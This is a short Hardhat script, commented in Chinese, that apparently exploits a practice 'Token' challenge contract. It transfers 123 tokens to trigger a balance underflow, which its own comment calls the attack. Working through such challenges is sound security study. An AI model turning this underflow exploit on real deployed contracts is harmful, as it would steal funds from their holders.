import hre from "hardhat";

// 請將以下地址替換成部屬後的實例合約地址
const token_address = "0xB6fE1A81704fB95E6658FFBE0DAe3aed344E4E7d";
console.log("目標 Token 實例合約地址:", token_address);

// 獲取合約實例
const token = await hre.ethers.getContractAt("Token", token_address);

const [signer] = await hre.ethers.getSigners();
console.log("我的帳戶地址: ", signer.address);

async function main() {
    // 顯示目前我的餘額
    console.log("My balance: ", await token.balanceOf(signer.address));

    await token.transfer("0xB6fE1A81704fB95E6658FFBE0DAe3aed344E4E7d", 123);

    // 顯示攻擊後，我的餘額
    console.log("My balance: ", await token.balanceOf(signer.address));
}


main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});